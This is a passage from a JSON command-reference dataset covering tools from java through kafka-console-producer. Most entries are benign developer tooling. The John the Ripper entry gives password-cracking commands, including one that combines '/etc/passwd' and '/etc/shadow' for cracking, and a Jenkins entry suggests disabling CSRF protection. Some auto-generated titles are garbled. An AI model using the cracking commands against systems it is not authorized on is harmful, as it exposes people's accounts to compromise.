      "java -XX:+PrintGCDetails -XX:+UseG1GC -Xloggc:gc.log MyApp  # Run with detailed GC logging and G1 garbage collector for performance monitoring"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "java [options] <class> [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Production application startup",
        "commands": "java -server -Xmx4g -XX:+UseG1GC -jar myapp.jar",
        "explanation": "Run server application with optimized settings",
        "title": "java"
      },
      {
        "scenario": "Debug Java application",
        "commands": "java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 Main",
        "explanation": "Start application with debugging port 5005",
        "title": "java"
      }
    ],
    "relatedCommands": [
      {
        "name": "javac",
        "relationship": "combo",
        "reason": "javac compiles source code that java executes"
      },
      {
        "name": "jps",
        "relationship": "combo",
        "reason": "jps shows running Java processes"
      },
      {
        "name": "jstack",
        "relationship": "combo",
        "reason": "jstack provides thread dumps for Java processes"
      }
    ],
    "warnings": [
      "Classpath separator differs between Unix (:) and Windows (;)",
      "Memory settings can significantly impact performance",
      "Main class must be fully qualified if in package"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.oracle.com/javase/8/docs/technotes/tools/unix/java.html"
      },
      {
        "platform": "macos",
        "url": "https://docs.oracle.com/javase/8/docs/technotes/tools/unix/java.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.oracle.com/javase/8/docs/technotes/tools/windows/java.html"
      },
      {
        "platform": "generic",
        "url": "https://docs.oracle.com/javase/tutorial/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "javac",
    "subtitle": "Java compiler",
    "description": "Java compiler for compiling Java source code",
    "examples": [
      "javac HelloWorld.java  # Compile Java source to bytecode class file",
      "javac -cp lib/*:. Main.java  # Compile with external JAR files in classpath",
      "javac -d build/ src/*.java  # Compile all Java files to build directory",
      "javac -g MyClass.java  # Include debugging information in class files",
      "javac -verbose HelloWorld.java  # Display detailed compilation process",
      "javac -target 8 LegacyCode.java  # Compile for Java 8 compatibility",
      "javac -Xlint:all Main.java  # Enable all compiler warnings",
      "javac -cp lib/*:src -d build -sourcepath src -Xlint:unchecked,deprecation src/Main.java  # Compile with comprehensive library support and specific warning categories"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "javac [options] <source files>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Compile and run Java program",
        "commands": "javac HelloWorld.java && java HelloWorld",
        "explanation": "Compile source then execute the class file",
        "title": "javac && java"
      },
      {
        "scenario": "Build project with dependencies",
        "commands": "javac -cp lib/*:src -d build src/**/*.java",
        "explanation": "Compile all source files with library dependencies",
        "title": "javac"
      }
    ],
    "relatedCommands": [
      {
        "name": "java",
        "relationship": "combo",
        "reason": "java runs the bytecode produced by javac"
      },
      {
        "name": "jar",
        "relationship": "combo",
        "reason": "jar packages compiled classes into archive files"
      },
      {
        "name": "maven",
        "relationship": "alternative",
        "reason": "Maven provides higher-level build automation"
      }
    ],
    "warnings": [
      "Classpath must include current directory (.) for local classes",
      "Package structure must match directory structure",
      "Compilation order matters for interdependent classes"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.oracle.com/javase/8/docs/technotes/tools/unix/javac.html"
      },
      {
        "platform": "macos",
        "url": "https://docs.oracle.com/javase/8/docs/technotes/tools/unix/javac.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.oracle.com/javase/8/docs/technotes/tools/windows/javac.html"
      },
      {
        "platform": "generic",
        "url": "https://docs.oracle.com/javase/tutorial/getStarted/cupojava/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "jenkins-cli",
    "subtitle": "Jenkins CLI",
    "description": "Command-line interface for Jenkins automation server",
    "examples": [
      "java -jar jenkins-cli.jar -s http://jenkins:8080 build my-job  # Trigger build of 'my-job' on Jenkins server",
      "java -jar jenkins-cli.jar -s http://jenkins:8080 list-jobs  # Show all jobs configured on Jenkins instance",
      "java -jar jenkins-cli.jar -s http://jenkins:8080 get-job my-job  # Retrieve job configuration XML",
      "java -jar jenkins-cli.jar -s http://jenkins:8080 create-job new-job < job.xml  # Create new Jenkins job from XML configuration",
      "java -jar jenkins-cli.jar -s http://jenkins:8080 install-plugin git  # Install Git plugin on Jenkins server",
      "java -jar jenkins-cli.jar -s http://jenkins:8080 restart  # Restart Jenkins server safely",
      "java -jar jenkins-cli.jar -s http://jenkins:8080 console my-job 123  # View console output for build #123",
      "java -jar jenkins-cli.jar -s https://jenkins:8443 -auth admin:token build my-job -p BRANCH=develop -p ENV=staging  # Trigger secure build with parameters"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "safe",
    "syntaxPattern": "java -jar jenkins-cli.jar [options] <command>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Automated deployment pipeline",
        "commands": "java -jar jenkins-cli.jar build deploy-staging -p BRANCH=main",
        "explanation": "Trigger deployment with branch parameter",
        "title": "java"
      },
      {
        "scenario": "Backup job configurations",
        "commands": "jenkins-cli.jar list-jobs | xargs -I {} jenkins-cli.jar get-job {} > {}.xml",
        "explanation": "Export all job configurations to XML files",
        "title": "jenkins | xargs >"
      }
    ],
    "relatedCommands": [
      {
        "name": "curl",
        "relationship": "alternative",
        "reason": "Jenkins REST API can be accessed via curl"
      },
      {
        "name": "git",
        "relationship": "combo",
        "reason": "Jenkins often integrates with Git repositories"
      },
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "Jenkins can build and deploy Docker containers"
      }
    ],
    "warnings": [
      "Requires authentication setup (API token/username)",
      "jenkins-cli.jar must be downloaded from Jenkins server",
      "CSRF protection may need to be disabled for CLI access"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.jenkins.io/doc/book/managing/cli/"
      },
      {
        "platform": "macos",
        "url": "https://www.jenkins.io/doc/book/managing/cli/"
      },
      {
        "platform": "windows",
        "url": "https://www.jenkins.io/doc/book/managing/cli/"
      },
      {
        "platform": "generic",
        "url": "https://www.jenkins.io/doc/book/managing/cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "jest",
    "subtitle": "Jest",
    "description": "JavaScript testing framework with built-in mocking and coverage",
    "examples": [
      "jest  # Execute all test files found in project",
      "jest --watch  # Re-run tests when files change",
      "jest user.test.js  # Run only tests in user.test.js file",
      "jest --coverage  # Run tests and generate code coverage report",
      "jest --testNamePattern='should login'  # Run only tests with names matching pattern",
      "jest src/components/  # Run tests only in components directory",
      "jest --updateSnapshot  # Update existing snapshot tests",
      "jest --maxWorkers=50%  # Limit Jest to use 50% of available CPU cores",
      "jest --testPathPattern=components --coverage  # Run component tests with coverage"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "jest [options] [testPathPattern]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development testing workflow",
        "commands": "jest --watch --coverage --verbose",
        "explanation": "Watch mode with coverage and detailed output",
        "title": "jest"
      },
      {
        "scenario": "CI testing pipeline",
        "commands": "jest --ci --coverage --watchAll=false",
        "explanation": "Run tests once with coverage for CI environment",
        "title": "jest"
      }
    ],
    "relatedCommands": [
      {
        "name": "mocha",
        "relationship": "alternative",
        "reason": "Alternative JavaScript testing framework"
      },
      {
        "name": "cypress",
        "relationship": "combo",
        "reason": "End-to-end testing complement to Jest unit tests"
      },
      {
        "name": "babel",
        "relationship": "combo",
        "reason": "Babel transforms modern JavaScript for Jest"
      }
    ],
    "warnings": [
      "Snapshot tests can become brittle over time",
      "Mocking modules can be complex",
      "Configuration in package.json or separate file"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://jestjs.io/docs/"
      },
      {
        "platform": "macos",
        "url": "https://jestjs.io/docs/"
      },
      {
        "platform": "windows",
        "url": "https://jestjs.io/docs/"
      },
      {
        "platform": "generic",
        "url": "https://jestjs.io/docs/cli"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "jmeter",
    "subtitle": "Java Meter",
    "description": "Java-based load testing and performance measurement tool",
    "examples": [
      "jmeter  # Launch JMeter GUI for test plan creation",
      "jmeter -n -t testplan.jmx -l results.jtl  # Run test plan in non-GUI mode and save results",
      "jmeter -g results.jtl -o html-report/  # Generate HTML dashboard from test results",
      "jmeter -n -t testplan.jmx -r  # Run distributed test using remote JMeter servers",
      "jmeter -n -t testplan.jmx -Jusers=100 -Jrampup=60  # Override test plan properties from command line",
      "jmeter -n -t testplan.jmx -e -o dashboard/  # Run test and generate HTML dashboard",
      "jmeter -n -t loadtest.jmx -R server1,server2,server3 -Gthreads=50 -Grampup=300 -l distributed_results.jtl  # Run distributed load test across multiple servers with custom parameters"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "jmeter [options] or java -jar ApacheJMeter.jar [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete load test workflow",
        "commands": "jmeter -n -t loadtest.jmx -l results.jtl && jmeter -g results.jtl -o report/ && open report/index.html",
        "explanation": "Run load test, generate report, and open results",
        "title": "jmeter && jmeter && open"
      }
    ],
    "relatedCommands": [
      {
        "name": "ab",
        "relationship": "simple-alternative",
        "reason": "Apache Bench is simpler for basic HTTP testing"
      },
      {
        "name": "gatling",
        "relationship": "alternative",
        "reason": "Modern Scala-based load testing tool"
      }
    ],
    "warnings": [
      "Very feature-rich with GUI and extensive protocols support",
      "Can be resource intensive - monitor test machine",
      "Test plans are XML files that can be version controlled"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://jmeter.apache.org/usermanual/"
      },
      {
        "platform": "macos",
        "url": "https://jmeter.apache.org/usermanual/"
      },
      {
        "platform": "windows",
        "url": "https://jmeter.apache.org/usermanual/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "jobs",
    "subtitle": "Jobs",
    "description": "Display active jobs in current shell session",
    "examples": [
      "jobs  # Show all background and suspended jobs",
      "jobs -p  # Display process IDs of job processes",
      "jobs -r  # Show only running background jobs",
      "jobs -s  # Show only suspended/stopped jobs",
      "jobs -l  # Display job information including process group IDs for advanced job control"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "jobs [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Background job management",
        "commands": "long_command & jobs && fg %1",
        "explanation": "Start job in background, list jobs, bring first job to foreground",
        "title": "long_command & jobs && fg"
      }
    ],
    "relatedCommands": [
      {
        "name": "bg",
        "relationship": "combo",
        "reason": "bg continues suspended jobs in background"
      },
      {
        "name": "fg",
        "relationship": "combo",
        "reason": "fg brings background jobs to foreground"
      }
    ],
    "warnings": [
      "Jobs are specific to current shell session",
      "Job numbers are assigned sequentially"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/bash/manual/bash.html#Job-Control-Commands"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/jobs.html"
      },
      {
        "platform": "windows",
        "url": "https://www.gnu.org/software/bash/manual/bash.html#Job-Control-Commands"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "john",
    "subtitle": "John the Ripper",
    "description": "Password security auditing and recovery tool for legitimate testing",
    "examples": [
      "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  # Test password strength using dictionary attack",
      "john --show hashes.txt  # Display previously cracked passwords",
      "john --rules --wordlist=custom.txt hashes.txt  # Apply password mangling rules during testing",
      "john --incremental hashes.txt  # Brute force attack with character set progression",
      "john --format=sha256crypt hashes.txt  # Crack SHA-256 Unix password hashes",
      "john --wordlist=combined.txt --rules=jumbo --format=NT hashes.txt --session=audit2024  # Professional password audit with custom wordlist and session management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "john [options] <password-file>",
    "prerequisites": [
      "advanced",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive password audit",
        "commands": "unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt",
        "explanation": "Audit system password security (with authorization)",
        "title": "unshadow > combined && john"
      }
    ],
    "relatedCommands": [
      {
        "name": "hashcat",
        "relationship": "similar",
        "reason": "GPU-accelerated password recovery tool"
      },
      {
        "name": "hydra",
        "relationship": "similar",
        "reason": "Network password brute-force tool"
      }
    ],
    "warnings": [
      "Only use on systems you own or have explicit permission",
      "Can be resource intensive",
      "Legal and ethical considerations must be observed"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.openwall.com/john/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "journalctl",
    "subtitle": "Journal Control",
    "description": "Query and display systemd journal logs",
    "examples": [
      "journalctl  # Display all journal entries (oldest first)",
      "journalctl -f  # Follow new log entries as they appear",
      "journalctl -u nginx  # Show logs only for nginx service",
      "journalctl --since '2025-09-01 10:00:00'  # Show logs from specific date and time",
      "journalctl --since today  # Display logs from today only",
      "journalctl -k  # Show only kernel messages",
      "journalctl -p err  # Show only error level messages and above",
      "journalctl -r  # Display logs in reverse chronological order",
      "journalctl -u apache2 --since 'yesterday' --until 'now' -o json-pretty --no-pager > apache_debug.json  # Export recent Apache logs in formatted JSON for analysis"
    ],
    "platform": [
      "linux"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "journalctl [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Service troubleshooting",
        "commands": "systemctl status nginx && journalctl -u nginx --since '10 minutes ago'",
        "explanation": "Check service status and recent logs",
        "title": "systemctl && journalctl"
      }
    ],
    "relatedCommands": [
      {
        "name": "systemctl",
        "relationship": "combo",
        "reason": "systemctl manages services, journalctl shows their logs"
      },
      {
        "name": "dmesg",
        "relationship": "similar",
        "reason": "dmesg shows kernel messages, journalctl -k does similar"
      }
    ],
    "warnings": [
      "systemd-only, not available on non-systemd systems",
      "Logs are stored in binary format, not plain text",
      "Can consume significant disk space over time"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/journalctl.1.html"
      },
      {
        "platform": "macos",
        "url": "Not available"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "jpegoptim",
    "subtitle": "JPEG Optimizer",
    "description": "Optimize JPEG image files for size reduction",
    "examples": [
      "jpegoptim --max=85 image.jpg  # Reduce JPEG quality to maximum 85% if higher",
      "jpegoptim --strip-all image.jpg  # Remove all metadata to reduce file size",
      "jpegoptim --size=500k image.jpg  # Optimize to achieve target size of 500KB",
      "jpegoptim --preserve --max=80 *.jpg  # Optimize all JPEGs while keeping original timestamps",
      "jpegoptim --verbose --max=90 --strip-all *.jpg  # Show progress while optimizing all JPEG files",
      "jpegoptim --dest=optimized/ --max=85 *.jpg  # Save optimized versions to separate directory",
      "jpegoptim --overwrite --max=75 --totals *.jpg  # Optimize in-place and show total savings",
      "find . -type f -name '*.jpg' -size +1M -exec jpegoptim --max=85 --strip-exif --preserve --dest=optimized/ {} \;  # Find large JPEGs and optimize them to separate directory"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "jpegoptim [options] files",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Web optimization workflow",
        "commands": "jpegoptim --max=85 --strip-all --preserve --totals *.jpg",
        "explanation": "Optimize for web with size reporting",
        "title": "jpegoptim"
      },
      {
        "scenario": "Recursive directory optimization",
        "commands": "find . -name '*.jpg' -exec jpegoptim --max=80 --strip-all {} \\;",
        "explanation": "Optimize all JPEG files in directory tree",
        "title": "find ;"
      }
    ],
    "relatedCommands": [
      {
        "name": "optipng",
        "relationship": "similar",
        "reason": "PNG optimization equivalent to jpegoptim"
      },
      {
        "name": "imagemagick",
        "relationship": "alternative",
        "reason": "ImageMagick can also optimize JPEG quality"
      },
      {
        "name": "jpegtran",
        "relationship": "similar",
        "reason": "Lossless JPEG transformations and optimization"
      }
    ],
    "warnings": [
      "Quality reduction is irreversible",
      "Some images may not benefit from optimization",
      "Progressive JPEG format may increase size for small images"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/tjko/jpegoptim"
      },
      {
        "platform": "macos",
        "url": "https://github.com/tjko/jpegoptim"
      },
      {
        "platform": "windows",
        "url": "https://github.com/tjko/jpegoptim"
      },
      {
        "platform": "generic",
        "url": "https://github.com/tjko/jpegoptim/blob/master/jpegoptim.1"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "jq",
    "subtitle": "JSON Query",
    "description": "Command-line JSON processor",
    "examples": [
      "cat data.json | jq '.'  # Format and colorize JSON output",
      "curl -s api.example.com/user | jq '.name'  # Get 'name' field from API response",
      "jq '.users[] | select(.active == true)' users.json  # Show only active users from array",
      "jq '{name: .full_name, email: .email_address}' input.json  # Create new JSON with renamed fields",
      "jq '.items | length' data.json  # Count number of items in array",
      "jq -s 'map(select(.status == \"active\")) | group_by(.category) | map({category: .[0].category, count: length})' *.json  # Combine multiple JSON files and create category summary statistics"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "caution",
    "syntaxPattern": "jq [options] '<filter>' [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "API data analysis",
        "commands": "curl -s api.example.com/stats | jq '.data[] | select(.value > 100) | .name'",
        "explanation": "Fetch API data and filter high-value items",
        "title": "curl | jq | select > 100 |"
      },
      {
        "scenario": "Convert CSV-like JSON to actual CSV",
        "commands": "jq -r '.[] | [.name, .email, .age] | @csv' users.json > users.csv",
        "explanation": "Convert JSON array to CSV format",
        "title": "jq | | > users"
      }
    ],
    "relatedCommands": [
      {
        "name": "curl",
        "relationship": "combo",
        "reason": "Process JSON responses from API calls"
      },
      {
        "name": "grep",
        "relationship": "similar",
        "reason": "Both filter and search through data"
      },
      {
        "name": "awk",
        "relationship": "similar",
        "reason": "Both process structured data with patterns"
      }
    ],
    "warnings": [
      "jq filter syntax can be complex for beginners",
      "String values need to be quoted in filters",
      "Empty results return null, not empty string"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/jq.1.html"
      },
      {
        "platform": "macos",
        "url": "https://stedolan.github.io/jq/manual/"
      },
      {
        "platform": "generic",
        "url": "https://jqlang.github.io/jq/"
      }
    ],
    "distroNotes": {
      "linux": "Usually available in package repos",
      "macos": "Install via Homebrew: brew install jq",
      "windows": "Available in WSL or download binary"
    }
  },
  {
    "name": "julia",
    "subtitle": "Julia",
    "description": "High-performance programming language for scientific computing",
    "examples": [
      "julia  # Launch Julia interactive environment",
      "julia script.jl  # Execute Julia script file",
      "julia -e 'println(\"Hello World\")'  # Run Julia code from command line",
      "julia -p 4 parallel_script.jl  # Start Julia with 4 worker processes",
      "julia --project=myproject  # Start Julia with specific project environment",
      "julia -O3 --compile=yes script.jl  # Run with maximum optimization and compilation",
      "julia --version  # Display Julia version information",
      "julia --threads=auto --project=myproject -e 'using Pkg; Pkg.instantiate(); include(\"benchmark.jl\")' > performance_results.txt  # Run multi-threaded Julia computation with project environment and save results"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "julia [options] [file] [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Package development workflow",
        "commands": "julia --project=. -e 'using Pkg; Pkg.instantiate(); Pkg.test()'",
        "explanation": "Install dependencies and run package tests",
        "title": "julia ; Pkg ; Pkg"
      },
      {
        "scenario": "High-performance computation",
        "commands": "julia -p auto --project=. -e 'using Distributed; @everywhere using MyPackage; result = pmap(compute, data)'",
        "explanation": "Use all CPU cores for distributed computation",
        "title": "julia ; ; result"
      }
    ],
    "relatedCommands": [
      {
        "name": "python3",
        "relationship": "alternative",
        "reason": "General-purpose scientific computing language"
      },
      {
        "name": "R",
        "relationship": "similar",
        "reason": "Statistical computing with different performance characteristics"
      },
      {
        "name": "matlab",
        "relationship": "alternative",
        "reason": "Commercial numerical computing environment"
      }
    ],
    "warnings": [
      "First-time compilation can be slow (startup latency)",
      "Package ecosystem smaller than Python/R",
      "Memory usage can be significant for large computations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.julialang.org/"
      },
      {
        "platform": "macos",
        "url": "https://docs.julialang.org/"
      },
      {
        "platform": "windows",
        "url": "https://docs.julialang.org/"
      },
      {
        "platform": "generic",
        "url": "https://docs.julialang.org/en/v1/manual/getting-started/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "jupyter",
    "subtitle": "Julia Python R",
    "description": "Jupyter Notebook and Lab interactive computing environment",
    "examples": [
      "jupyter notebook  # Launches Jupyter Notebook server in current directory",
      "jupyter lab  # Launches JupyterLab, the next-generation Jupyter interface",
      "jupyter nbconvert notebook.ipynb --to html  # Converts Jupyter notebook to static HTML file",
      "jupyter kernelspec list  # Shows all installed Jupyter kernels and their locations",
      "jupyter notebook --port=8888 --no-browser  # Starts Jupyter server on port 8888 without opening browser automatically",
      "jupyter nbconvert notebook.ipynb --to pdf  # Convert notebook to PDF format",
      "jupyter nbconvert analysis.ipynb --to html --template=classic --output-dir=reports/ --ExecutePreprocessor.timeout=600  # Execute notebook and generate report with extended timeout"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "jupyter [subcommand] [options]",
    "prerequisites": [
      "python3",
      "pip"
    ],
    "commandCombinations": [
      {
        "scenario": "Start Jupyter with custom configuration",
        "commands": "jupyter notebook --generate-config && jupyter notebook --config=/path/to/jupyter_notebook_config.py",
        "explanation": "Generates default config file and starts Jupyter with custom configuration",
        "title": "jupyter && jupyter"
      },
      {
        "scenario": "Convert notebook and open result",
        "commands": "jupyter nbconvert notebook.ipynb --to html && open notebook.html",
        "explanation": "Converts notebook to HTML and opens the result in default browser",
        "title": "jupyter && open"
      }
    ],
    "relatedCommands": [
      {
        "name": "python3",
        "relationship": "dependency",
        "reason": "Jupyter is built on Python and requires Python runtime"
      },
      {
        "name": "ipython",
        "relationship": "underlying",
        "reason": "IPython provides the interactive Python kernel for Jupyter"
      },
      {
        "name": "conda",
        "relationship": "package-manager",
        "reason": "Conda is commonly used to install and manage Jupyter environments"
      }
    ],
    "warnings": [
      "Default port 8888 may be occupied by other services",
      "Kernel crashes can cause notebook cells to lose state",
      "Large notebooks may consume significant memory",
      "Browser security may block some features on localhost"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://jupyter.readthedocs.io/en/latest/install.html"
      },
      {
        "platform": "macos",
        "url": "https://jupyter.readthedocs.io/en/latest/install.html"
      },
      {
        "platform": "windows",
        "url": "https://jupyter.readthedocs.io/en/latest/install.html"
      },
      {
        "platform": "generic",
        "url": "https://jupyter.readthedocs.io/en/latest/"
      }
    ],
    "distroNotes": {
      "windows": "Available through Anaconda, pip, or conda installation",
      "linux": "Available through package managers, pip, or conda",
      "macos": "Available through Homebrew, pip, or conda"
    }
  },
  {
    "name": "k6",
    "subtitle": "k6 Load Testing",
    "description": "Modern load testing tool with scripting capabilities for performance monitoring",
    "examples": [
      "k6 run script.js  # Execute load test script",
      "k6 run --vus 50 --duration 30s script.js  # Run test with 50 virtual users for 30 seconds",
      "k6 run --out json=results.json script.js  # Save test results to JSON file",
      "k6 run -e API_BASE=https://api.example.com script.js  # Pass environment variables to test",
      "k6 run --stage 5s:10,10s:20,5s:0 script.js  # Ramp up and down virtual users in stages",
      "k6 run --http-debug script.js  # Enable HTTP request/response debugging",
      "k6 run --vus 100 --duration 10m --out influxdb=http://localhost:8086/k6 --thresholds 'http_req_duration{p(95)}<500' test.js  # Production-scale test with performance thresholds and metrics export"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "k6 run [options] <script>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Performance monitoring",
        "commands": "k6 run --vus 10 --duration 5m --out influxdb=http://localhost:8086/k6 script.js",
        "explanation": "Long-running test with InfluxDB output",
        "title": "k6"
      }
    ],
    "relatedCommands": [
      {
        "name": "artillery",
        "relationship": "alternative",
        "reason": "Alternative load testing tool"
      },
      {
        "name": "jmeter",
        "relationship": "alternative",
        "reason": "Java-based load testing tool"
      }
    ],
    "warnings": [
      "Scripts are written in JavaScript",
      "Browser automation requires k6 browser",
      "Cloud execution requires separate service"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://k6.io/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "k9s",
    "subtitle": "K9s",
    "description": "Terminal-based UI for interacting with Kubernetes clusters",
    "examples": [
      "k9s  # Start interactive Kubernetes cluster dashboard",
      "k9s --context production-cluster  # Launch K9s with specific kubectl context",
      "k9s --namespace kube-system  # Open K9s focused on kube-system namespace",
      "k9s --readonly  # Launch K9s in read-only mode to prevent accidental changes",
      "k9s --config /path/to/config.yml  # Use custom K9s configuration file",
      "k9s --logLevel debug  # Run K9s with debug logging enabled",
      "k9s --headless --command 'pods'  # Run K9s command without interactive UI",
      "k9s --context production-cluster --namespace monitoring --crumbsless --screen-dump-dir /tmp/k9s-dumps  # Professional cluster monitoring with automated screenshots"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "k9s [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Multi-cluster monitoring setup",
        "commands": "kubectl config get-contexts && k9s --context cluster1",
        "explanation": "List available contexts then connect to specific cluster",
        "title": "kubectl && k9s"
      },
      {
        "scenario": "Production monitoring",
        "commands": "k9s --context production --namespace monitoring --readonly",
        "explanation": "Safe monitoring of production cluster in read-only mode",
        "title": "k9s"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "alternative",
        "reason": "K9s provides UI alternative to kubectl commands"
      },
      {
        "name": "kubectx",
        "relationship": "combo",
        "reason": "kubectx switches contexts that K9s can use"
      }
    ],
    "warnings": [
      "Requires kubeconfig access to clusters",
      "Keyboard shortcuts different from standard terminal applications",
      "Resource deletion operations are permanent",
      "Plugin system allows custom commands and views"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://k9scli.io/"
      },
      {
        "platform": "macos",
        "url": "https://k9scli.io/"
      },
      {
        "platform": "windows",
        "url": "https://k9scli.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kafka-console-consumer",
    "subtitle": "Kafka Console Consumer",
    "description": "Kafka console consumer for reading messages",
    "examples": [
      "kafka-console-consumer --bootstrap-server localhost:9092 --topic test-topic --from-beginning  # Reads all messages in topic from the earliest offset",
      "kafka-console-consumer --bootstrap-server localhost:9092 --topic orders --property print.key=true --property key.separator=:  # Displays both message keys and values",
      "kafka-console-consumer --bootstrap-server localhost:9092 --topic events --group my-consumer-group  # Joins specified consumer group for load balancing",
      "kafka-console-consumer --bootstrap-server localhost:9092 --topic logs --max-messages 100  # Consume only first 100 messages then exit",
      "kafka-console-consumer --bootstrap-server localhost:9092 --topic transactions --group analytics-team --auto-offset-reset latest --partition 0,1,2  # Consume from specific partitions with consumer group for production analytics"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "data-processing",
    "safety": "safe",
    "syntaxPattern": "kafka-console-consumer --bootstrap-server [server] --topic [topic] [options]",
    "prerequisites": [
      "kafka",
      "java"
    ],
    "commandCombinations": [
      {
        "scenario": "Consume and save to file",
        "commands": "kafka-console-consumer --bootstrap-server localhost:9092 --topic logs --from-beginning > kafka-logs.txt",
        "explanation": "Consumes all log messages and saves them to a file",
        "title": "kafka > kafka"
      },
      {
        "scenario": "Monitor multiple topics",
        "commands": "kafka-console-consumer --bootstrap-server localhost:9092 --whitelist 'events|orders|logs' --from-beginning",
        "explanation": "Consumes from multiple topics matching the pattern",
        "title": "kafka | orders | logs"
      }
    ],
    "relatedCommands": [
      {
        "name": "kafka-console-producer",
        "relationship": "complement",
        "reason": "Producer counterpart for sending messages to Kafka topics"
      },
      {
        "name": "kafka-consumer-groups",
        "relationship": "related",
        "reason": "Manages consumer groups and offsets for consumers"
      },
      {
        "name": "kcat",
        "relationship": "alternative",
        "reason": "More feature-rich producer/consumer tool for Kafka"
      }
    ],
    "warnings": [
      "Without --from-beginning, only shows new messages",
      "Consumer will run indefinitely until stopped with Ctrl+C",
      "Consumer group membership affects message delivery",
      "Key printing must be enabled explicitly to see message keys"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kafka.apache.org/documentation/#quickstart_consume"
      },
      {
        "platform": "macos",
        "url": "https://kafka.apache.org/documentation/#quickstart_consume"
      },
      {
        "platform": "windows",
        "url": "https://kafka.apache.org/documentation/#quickstart_consume"
      },
      {
        "platform": "generic",
        "url": "https://kafka.apache.org/documentation/#basic_ops_consumer_producer"
      }
    ],
    "distroNotes": {
      "windows": "Requires Kafka installation and proper PATH configuration",
      "linux": "Available through Kafka binary distribution or package managers",
      "macos": "Can be installed via Homebrew or Kafka binary distribution"
    }
  },
  {
    "name": "kafka-console-producer",
    "subtitle": "Kafka Console Producer",
    "description": "Kafka console producer for sending messages",
    "examples": [
      "kafka-console-producer --bootstrap-server localhost:9092 --topic test-topic  # Opens interactive console to send messages to specified topic",
